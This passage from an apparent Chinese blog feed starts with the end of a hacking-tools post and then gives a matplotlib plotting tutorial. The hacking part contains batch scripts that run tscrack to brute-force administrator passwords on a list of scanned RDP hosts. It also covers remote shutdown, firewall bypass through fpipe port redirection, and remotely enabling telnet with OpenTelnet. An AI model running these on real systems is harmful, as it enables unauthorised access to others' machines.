hack.bat %%i<br>　　nscan<br>　　@echo 3389.txt no find or scan faild<br>　　(①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt)<br>　　3389.bat意思是：从3389.txt文件中取一个IP，接着运行hack.bat<br>　　@if not exist tscrack.exe goto noscan<br>　　@tscrack %1 -l administrator -w pass.dic &gt;&gt;rouji.txt<br>　　:noscan<br>　　@echo tscrack.exe no find or scan faild<br>　　(②存为hack.bat) (运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了)<br>　　hack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的administrator密码，并将破解结果保存在rouji.txt文件中。<br>　　其它<br>　　Shutdown.exe<br>　　Shutdown IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。）<br>　　fpipe.exe (TCP端口重定向工具) 在第二篇中有详细说明（端口重定向绕过防火墙）<br>　　fpipe -l 80 -s 1029 -r 80 当有人扫锚你的80端口时，他扫到的结果会完全是的主机信息<br>　　Fpipe -l 23 -s 88 -r 23 目标IP 把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的88端口与其相连接）然后：直接Telnet 127.0.0.1（本机IP）就连接到目标IP的23端口了。<br>　　OpenTelnet.exe (远程开启telnet工具)<br>　　opentelnet.exe IP 帐号　密码　ntlm认证方式　Telnet端口 （不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet ip 连接上对方。<br>　　NTLM认证方式：0：不使用NTLM身份验证；1：先尝试NTLM身份验证，如果失败，再使用用户名和密码；2：只使用NTLM身份验证。<br>　　ResumeTelnet.exe (OpenTelnet附带的另一个工具)<br>　　resumetelnet.exe IP　帐号　密码 用Telnet连接完对方后，就用这个命令将对方的Telnet设置还原，并同时关闭Telnet服务。<br>　　FTP命令详解<br>　　FTP命令是Internet用户使用最频繁的命令之一，熟悉并灵活应用FTP的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学习使用进行后台FTP下载，那么就必须学习FTP指令。<br>　　FTP的命令行格式为：<br>　　ftp -v -d -i -n -g [主机名] ，其中<br>　　-v 显示远程服务器的所有响应信息<br>　　-n 限制ftp的自动登录，即不使用；.n etrc文件；<br>　　-d 使用调试方式；<br>　　-g 取消全局文件名。<br>　　FTP使用的内部命令如下(中括号表示可选项):<br>　　1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：!ls<em>.zip<br>　　2.$ macro-ame[args]： 执行宏定义macro-name。<br>　　3.account[password]： 提供登录远程系统成功后访问系统资源所需的补充口令。<br>　　4.append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。<br>　　5.ascii：使用ascii类型传输方式。<br>　　6.bell：每个命令执行完毕后计算机响铃一次。<br>　　7.bin：使用二进制文件传输方式。<br>　　8.bye：退出ftp会话过程。<br>　　9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。<br>　　10. cd remote-dir：进入远程主机目录。<br>　　11.cdup：进入远程主机目录的父目录。<br>　　12.chmod mode file-name：将远程主机文件file-name的存取方式设置为mode，如：chmod 777 a.out。<br>　　13.close：中断与远程服务器的ftp会话(与open对应)。<br>　　14 .cr：使用asscii方式传输文件时，将回车换行转换为回行。<br>　　15.delete remote-file：删除远程主机文件。<br>　　16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。<br>　　17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件。<br>　　18.disconnection：同close。<br>　　19.form format：将文件传输方式设置为format，缺省为file方式。<br>　　20.get remote-file[local-file]： 将远程主机的文件remote-file传至本地硬盘的local-file。<br>　　21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。<br>　　22.hash：每传输1024字节，显示一个hash符号(#)。<br>　　23.help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get。<br>　　24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。<br>　　25.image：设置二进制传输方式(同binary)。<br>　　26.lcd[dir]：将本地工作目录切换至dir。<br>　　27. ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本地文件local-file。<br>　　28.macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结束。<br>　　29.mdelete[remote-file]：删除远程主机文件。<br>　　30.mdir remote-files local-file：与dir类似，但可指定多个远程文件，如 ：mdir </em>.o.*.zipoutfile 。<br>　　31.mget remote-files：传输多个远程文件。<br>　　32.mkdir dir-name：在远程主机中建一目录。<br>　　33.mls remote-file local-file：同nlist，但可指定多个文件名。<br>　　34.mode[modename]：将文件传输方式设置为modename， 缺省为stream方式。<br>　　35.modtime file-name：显示远程主机文件的最后修改时间。<br>　　36.mput local-file：将多个文件传输至远程主机。<br>　　37.newer file-name： 如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。<br>　　38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的local-file。<br>　　39.nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：nmap $1.$2.$3[$1，$2].[$2，$3]，则传输文件a1.a2.a3时，文件名变为a1，a2。 该命令特别适用于远程主机为非UNIX机的情况。<br>　　40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans1R，则文件名LLL将变为RRR。<br>　　41.open host[port]：建立指定ftp服务器连接，可指定连接端口。<br>　　42.passive：进入被动传输方式。<br>　　43.prompt：设置多个文件传输时的交互提示。<br>　　44.proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。<br>　　45.put local-file[remote-file]：将本地文件local-file传送至远程主机。<br>　　46.pwd：显示远程主机的当前工作目录。<br>　　47.quit：同bye，退出ftp会话。<br>　　48.quote arg1，arg2…：将参数逐字发至远程ftp服务器，如：quote syst.<br>　　49.recv remote-file[local-file]：同get。<br>　　50.reget remote-file[local-file]：类似于get， 但若local-file存在，则从上次传输中断处续传。<br>　　51.rhelp[cmd-name]：请求获得远程主机的帮助。<br>　　52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。<br>　　53.rename[from][to]：更改远程主机文件名。<br>　　54.reset：清除回答队列。<br>　　55.restart marker：从指定的标志marker处，重新开始get或put，如：restart 130。<br>　　56.rmdir dir-name：删除远程主机目录。<br>　　57.runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2等。<br>　　58.send local-file[remote-file]：同put。<br>　　59.sendport：设置PORT命令的使用。<br>　　60.site arg1，arg2…：将参数作为SITE命令逐字发送至远程ftp主机。<br>　　61.size file-name：显示远程主机文件大小，如：site idle 7200。<br>　　62.status：显示当前ftp状态。<br>　　63.struct[struct-name]：将文件传输结构设置为struct-name， 缺省时使用stream结构。<br>　　64.sunique：将远程主机文件名存储设置为只一(与runique对应)。<br>　　65.system：显示远程主机的操作系统类型。<br>　　66.tenex：将文件传输类型设置为TENEX机的所需的类型。<br>　　67.tick：设置传输时的字节计数器。<br>　　68.trace：设置包跟踪。<br>　　69.type[type-name]：设置文件传输类型为type-name，缺省为ascii，如:type binary，设置二进制传输方式。<br>　　70.umask[newmask]：将远程服务器的缺省umask设置为newmask，如：umask 3<br>　　71.user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：user anonymous my@email。<br>　　72.verbose：同命令行的-v参数，即设置详尽报告方式，ftp 服务器的所有响 应都将显示给用户，缺省为on.<br>　　73.?[cmd]：同help.</del></p>]]></content>
      
      <categories>
          
          <category> Essay </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Essay </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python-Learning-3</title>
      <link href="/2018/11/26/Python-Learning-3/"/>
      <url>/2018/11/26/Python-Learning-3/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>绘制简单的折线图</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">sq=[<span class="number">1</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">16</span>,<span class="number">25</span>]</span><br><span class="line">plt.plot(sq)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/Python-Learning-3/1.png" alt=""></p><p><strong>理解matplotlib、pylab与pyplot之间的关系</strong><br><a href="https://blog.csdn.net/IAMoldpan/article/details/78774901" target="_blank" rel="noopener">https://blog.csdn.net/IAMoldpan/article/details/78774901</a><br>官方介绍: <a href="http://matplotlib.org/faq/usage_faq.html#matplotlib-pylab-and-pyplot-how-are-they-related" target="_blank" rel="noopener">http://matplotlib.org/faq/usage_faq.html#matplotlib-pylab-and-pyplot-how-are-they-related</a></p><p>先来说matplotlib与pylab<br>这些模块其实功能都相同，程序运行的时候都在运行相同的code，不同的是导入模块的方式不同。</p><p>我们需要注意的是，matplotlib有两个使用接口，一种是状态机( state-machine )层的接口，通过pyplot模块来进行管理。另一种是面向对象的接口，这边有个例子： How can I attach a pyplot function to a figure instance?</p><p>pylab将所有的功能函数（pyplot状态机函数，大部分时numpy里面的函数）全部导入其单独的命名空间内。为什么要这样做，是因为这样可以很好地与ipython（或者类似的IDE，比如pycharm）实现很好的交互模式，这个就和MATLAB差不多。</p><p>也就是说，看你想要做什么，如果你不在一个gui的编程界面中（或者说不是一个可交互的后台，没有使用提供的后台交互），你做的只是：</p><p>import matplotlib.pyplot as plt<br>import numpy as np</p><p>plt.plot(….)</p><p>这样不会造成命名空间的混乱，一般更建议这种做法。</p><p>ipython —pylab</p><p>与</p><p>from pylab import * </p><p>效果一样</p><p>现在通常这样用：<br>ipython —matplotlib，这样的话就可以不用一些导入那么多的功能函数，而是需要什么加入什么。</p><p>import numpy as np<br>import matplotlib.pyplot as plt</p><p>同样，如果你将matplotlib嵌入到gui中，但你不想导入pyplot使系统运行额外的gui程序，则你需要做的是需要什么就导入什么。</p><p>最后的建议<br>pylab和pyplot的区别是，前者将numpy导入了其命名空间中。这样会使pylab表现的和matlab更加相似。现在来说我们经常使用pyplot，因为pyplot相比pylab更加纯粹。</p><p>资料来自：<a href="https://stackoverflow.com/questions/16849483/which-is-the-recommended-way-to-plot-matplotlib-or-pylab" target="_blank" rel="noopener">https://stackoverflow.com/questions/16849483/which-is-the-recommended-way-to-plot-matplotlib-or-pylab</a></p><p><strong>修改标签文字和线条粗细</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">sq=[<span class="number">1</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">16</span>,<span class="number">25</span>]</span><br><span class="line">plt.plot(sq,linewidth=<span class="number">5</span>)</span><br><span class="line"><span class="comment">#设置图表标题，并给坐标加上标签</span></span><br><span class="line">plt.title(<span class="string">"Square Number"</span>,fontsize=<span class="number">24</span>)</span><br><span class="line">plt.xlabel(<span class="string">"Value"</span>,fontsize=<span class="number">14</span>)</span><br><span class="line">plt.ylabel(<span class="string">"Square of Value"</span>,fontsize=<span class="number">14</span>)</span><br><span class="line"><span class="comment">#设置刻度标记的大小</span></span><br><span class="line">plt.tick_params(axis=<span class="string">'both'</span>, labelsize=<span class="number">14</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/Python-Learning-3/2.png" alt=""></p><p><strong>校正图形</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">input_values = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">squares = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>]</span><br><span class="line">plt.plot(input_values, squares, linewidth=<span class="number">5</span>)</span><br><span class="line"><span class="comment">#设置图表标题，并给坐标加上标签</span></span><br><span class="line">plt.title(<span class="string">"Square Number"</span>,fontsize=<span class="number">24</span>)</span><br><span class="line">plt.xlabel(<span class="string">"Value"</span>,fontsize=<span class="number">14</span>)</span><br><span class="line">plt.ylabel(<span class="string">"Square of Value"</span>,fontsize=<span class="number">14</span>)</span><br><span class="line"><span class="comment">#设置刻度标记的大小</span></span><br><span class="line">plt.tick_params(axis=<span class="string">'both'</span>, labelsize=<span class="number">14</span>)</span><br><span class="line"><span class="comment"># plt.show()</span></span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/Python-Learning-3/3.png" alt=""></p><p><strong>使用scatter() 绘制散点图并设置其样式</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">plt.scatter(<span class="number">2</span>, <span class="number">4</span>, s=<span class="number">200</span>)</span><br><span class="line"><span class="comment"># 设置图表标题并给坐标轴加上标签</span></span><br><span class="line">plt.title(<span class="string">"Square Numbers"</span>, fontsize=<span class="number">24</span>)</span><br><span class="line">plt.xlabel(<span class="string">"Value"</span>, fontsize=<span class="number">14</span>)</span><br><span class="line">plt.ylabel(<span class="string">"Square of Value"</span>, fontsize=<span class="number">14</span>)</span><br><span class="line"><span class="comment"># 设置刻度标记的大小</span></span><br><span class="line">plt.tick_params(axis=<span class="string">'both'</span>, which=<span class="string">'major'</span>, labelsize=<span class="number">14</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/Python-Learning-3/4.png" alt=""></p><p><strong>使用scatter() 绘制一系列点</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">x_values = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">y_values = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>]</span><br><span class="line">plt.scatter(x_values, y_values, s=<span class="number">100</span>)</span><br><span class="line"><span class="comment"># 设置图表标题并给坐标轴指定标签</span></span><br><span class="line">plt.title(<span class="string">"Square Numbers"</span>, fontsize=<span class="number">24</span>)</span><br><span class="line">plt.xlabel(<span class="string">"Value"</span>, fontsize=<span class="number">14</span>)</span><br><span class="line">plt.ylabel(<span class="string">"Square of Value"</span>, fontsize=<span class="number">14</span>)</span><br><span class="line"><span class="comment"># 设置刻度标记的大小</span></span><br><span class="line">plt.tick_params(axis=<span class="string">'both'</span>, which=<span class="string">'major'</span>, labelsize=<span class="number">14</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/Python-Learning-3/5.png" alt=""></p><p><strong>自动计算数据</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">x_values = list(range(<span class="number">1</span>, <span class="number">1001</span>))</span><br><span class="line">y_values = [x**<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> x_values]</span><br><span class="line">plt.scatter(x_values, y_values, s=<span class="number">40</span>)</span><br><span class="line"><span class="comment"># 设置图表标题并给坐标轴加上标签</span></span><br><span class="line">plt.title(<span class="string">"Square Numbers"</span>, fontsize=<span class="number">24</span>)</span><br><span class="line">plt.xlabel(<span class="string">"Value"</span>, fontsize=<span class="number">14</span>)</span><br><span class="line">plt.ylabel(<span class="string">"Square of Value"</span>, fontsize=<span class="number">14</span>)</span><br><span class="line"><span class="comment"># 设置刻度标记的大小</span></span><br><span class="line">plt.tick_params(axis=<span class="string">'both'</span>, which=<span class="string">'major'</span>, labelsize=<span class="number">14</span>)</span><br><span class="line"><span class="comment"># 设置每个坐标轴的取值范围</span></span><br><span class="line">plt.axis([<span class="number">0</span>, <span class="number">1100</span>, <span class="number">0</span>, <span class="number">1100000</span>])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/Python-Learning-3/6.png" alt=""></p><p><strong>删除数据点的轮廓</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plt.scatter(x_values, y_values, edgecolor=&apos;none&apos;, s=40)</span><br></pre></td></tr></table></figure><p><strong>自定义颜色</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plt.scatter(x_values, y_values, c=&apos;red&apos;, edgecolor=&apos;none&apos;, s=40)</span><br><span class="line"></span><br><span class="line">plt.scatter(x_values, y_values, c=(0, 0, 0.8), edgecolor=&apos;none&apos;, s=40)</span><br></pre></td></tr></table></figure><p><strong>使用颜色映射</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">x_values = list(range(<span class="number">1001</span>))</span><br><span class="line">y_values = [x**<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> x_values]</span><br><span class="line">plt.scatter(x_values, y_values, c=y_values, cmap=plt.cm.Blues,</span><br><span class="line">edgecolor=<span class="string">'none'</span>, s=<span class="number">40</span>)</span><br><span class="line"><span class="comment"># 设置图表标题并给坐标轴加上标签</span></span><br><span class="line">plt.title(<span class="string">"Square Numbers"</span>, fontsize=<span class="number">24</span>)</span><br><span class="line">plt.xlabel(<span class="string">"Value"</span>, fontsize=<span class="number">14</span>)</span><br><span class="line">plt.ylabel(<span class="string">"Square of Value"</span>, fontsize=<span class="number">14</span>)</span><br><span class="line"><span class="comment"># 设置刻度标记的大小</span></span><br><span class="line">plt.tick_params(axis=<span class="string">'both'</span>, which=<span class="string">'major'</span>, labelsize=<span class="number">14</span>)</span><br><span class="line"><span class="comment"># 设置每个坐标轴的取值范围</span></span><br><span class="line">plt.axis([<span class="number">0</span>, <span class="number">1100</span>, <span class="number">0</span>, <span class="number">1100000</span>])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure></p><p><img src="/2018/11/26/Python-Learning-3/7.png" alt=""></p><p><strong>自动保存图表</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plt.savefig(<span class="string">'squares_plot.png'</span>, bbox_inches=<span class="string">'tight'</span>)</span><br></pre></td></tr></table></figure></p><p><strong>随机漫步</strong></p><p><strong>随机漫步</strong>是这样行走得到的路径：每次行走都完全是随机的，没有明确的方向，结果是由一系列随机决策决定的。你可以这样认为，随机漫步就是蚂蚁在晕头转向的情况下，每次都沿随机的方向前行所经过的路径。<br><strong>创建RandomWalk() 类</strong><br><strong>选择方向</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RandomWalk</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""一个生成随机漫步数据的类"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, num_points=<span class="number">5000</span>)</span>:</span></span><br><span class="line">        <span class="string">"""初始化随机漫步的属性"""</span></span><br><span class="line">        self.num_points = num_points</span><br><span class="line">        <span class="comment"># 所有随机漫步都始于(0, 0)</span></span><br><span class="line">        self.x_values = [<span class="number">0</span>]</span><br><span class="line">        self.y_values = [<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fill_walk</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""计算随机漫步包含的所有点"""</span></span><br><span class="line">        <span class="comment"># 不断漫步，直到列表达到指定的长度</span></span><br><span class="line">        <span class="keyword">while</span> len(self.x_values) &lt; self.num_points:</span><br><span class="line">        <span class="comment"># 决定前进方向以及沿这个方向前进的距离</span></span><br><span class="line">            x_direction = choice([<span class="number">1</span>, <span class="number">-1</span>])</span><br><span class="line">            x_distance = choice([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</span><br><span class="line">            x_step = x_direction * x_distance</span><br><span class="line">            y_direction = choice([<span class="number">1</span>, <span class="number">-1</span>])</span><br><span class="line">            y_distance = choice([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</span><br><span class="line">            y_step = y_direction * y_distance</span><br><span class="line">        <span class="comment"># 拒绝原地踏步</span></span><br><span class="line">            <span class="keyword">if</span> x_step == <span class="number">0</span> <span class="keyword">and</span> y_step == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># 计算下一个点的x和y值</span></span><br><span class="line">            next_x = self.x_values[<span class="number">-1</span>] + x_step</span><br><span class="line">            next_y = self.y_values[<span class="number">-1</span>] + y_step</span><br><span class="line">            self.x_values.append(next_x)</span><br><span class="line">            self.y_values.append(next_y)</span><br></pre></td></tr></table></figure></p><p>使用choice([1, -1]) 给x_direction 选择一个值，结果要么是表示向右走的1，要么是表示向左走的-1。接下来，choice([0, 1, 2, 3, 4]) 随机地选择一个0~4之间的整数，告诉Python 沿指定的方向走多远（x_distance ）。（通过包含0，我们不仅能够沿两个轴移动，还能够沿y 轴移动。）</p><p><strong>绘制随机漫步图</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> random_walk <span class="keyword">import</span> RandomWalk</span><br><span class="line"><span class="comment"># 创建一个RandomWalk实例，并将其包含的点都绘制出来</span></span><br><span class="line">rw = RandomWalk()</span><br><span class="line">rw.fill_walk()</span><br><span class="line">plt.scatter(rw.x_values, rw.y_values, s=<span class="number">15</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/Python-Learning-3/8.png" alt=""></p><p><strong>模拟多次随机漫步</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> random_walk <span class="keyword">import</span> RandomWalk</span><br><span class="line"><span class="comment"># 只要程序处于活动状态，就不断地模拟随机漫步</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="comment"># 创建一个RandomWalk实例，并将其包含的点都绘制出来</span></span><br><span class="line">    rw = RandomWalk()</span><br><span class="line">    rw.fill_walk()</span><br><span class="line">    plt.scatter(rw.x_values, rw.y_values, s=<span class="number">15</span>)</span><br><span class="line">    plt.show()</span><br><span class="line">    keep_running = input(<span class="string">"Make another walk? (y/n): "</span>)</span><br><span class="line">    <span class="keyword">if</span> keep_running==<span class="string">'n'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/Python-Learning-3/9.png" alt=""><br>Make another walk? (y/n): y<br><img src="/2018/11/26/Python-Learning-3/10.png" alt=""><br>Make another walk? (y/n): y<br><img src="/2018/11/26/Python-Learning-3/11.png" alt=""><br>Make another walk? (y/n): y<br><img src="/2018/11/26/Python-Learning-3/12.png" alt=""><br>Make another walk? (y/n): n</p><p><strong>设置随机漫步图的样式</strong></p><p><strong>给点着色</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> random_walk <span class="keyword">import</span> RandomWalk</span><br><span class="line"><span class="comment"># 只要程序处于活动状态，就不断地模拟随机漫步</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="comment"># 创建一个RandomWalk实例，并将其包含的点都绘制出来</span></span><br><span class="line">    rw.fill_walk()</span><br><span class="line">    point_numbers = list(range(rw.num_points))</span><br><span class="line">    plt.scatter(rw.x_values, rw.y_values, c=point_numbers, cmap=plt.cm.Blues,</span><br><span class="line">    edgecolor=<span class="string">'none'</span>, s=<span class="number">15</span>)</span><br><span class="line">    plt.show()</span><br><span class="line">    keep_running = input(<span class="string">"Make another walk? (y/n): "</span>)</span><br><span class="line">    <span class="keyword">if</span> keep_running==<span class="string">'n'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/Python-Learning-3/13.png" alt=""><br>Make another walk? (y/n): n</p><p><strong>重新绘制起点和终点</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> random_walk <span class="keyword">import</span> RandomWalk</span><br><span class="line"><span class="comment"># 只要程序处于活动状态，就不断地模拟随机漫步</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="comment"># 创建一个RandomWalk实例，并将其包含的点都绘制出来</span></span><br><span class="line">    rw.fill_walk()</span><br><span class="line">    point_numbers = list(range(rw.num_points))</span><br><span class="line">    plt.scatter(rw.x_values, rw.y_values, c=point_numbers, cmap=plt.cm.Blues,</span><br><span class="line">edgecolor=<span class="string">'none'</span>, s=<span class="number">15</span>)</span><br><span class="line">    <span class="comment"># 突出起点和终点</span></span><br><span class="line">    plt.scatter(<span class="number">0</span>, <span class="number">0</span>, c=<span class="string">'green'</span>, 